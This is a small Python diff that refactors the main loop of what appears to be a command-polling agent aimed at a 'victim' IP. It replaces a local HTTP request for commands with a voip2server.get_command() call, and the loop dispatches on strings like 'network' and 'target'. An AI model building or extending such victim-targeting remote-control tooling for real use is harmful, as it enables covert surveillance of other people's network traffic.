@@ -18,8 +18,7 @@ def voip_pattern(victim_ip):
     voip2server.get_pcap()
 def main():
     while(True):
-        resp = requests.get("http://localhost:5000/getcommand")
-        content = resp.content.decode("utf-8")
+        content = voip2server.get_command()
         if(content.find("network") >-1):
             get_networks()
         elif(content.find("target")):
